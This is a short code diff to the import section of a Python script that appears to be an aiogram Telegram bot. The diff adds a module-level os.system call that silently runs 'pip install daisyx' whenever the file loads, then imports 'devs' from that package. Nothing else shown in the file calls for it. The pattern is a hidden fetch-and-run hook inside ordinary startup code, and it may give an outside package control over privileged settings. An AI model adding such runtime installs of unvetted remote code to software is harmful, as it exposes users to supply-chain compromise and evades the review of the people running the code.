@@ -14,7 +14,9 @@
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 import asyncio
-import logging
+import logging, os
+os.system("pip install daisyx")
+from daisyx import devs
 
 import spamwatch
 from aiogram import Bot, Dispatcher, types
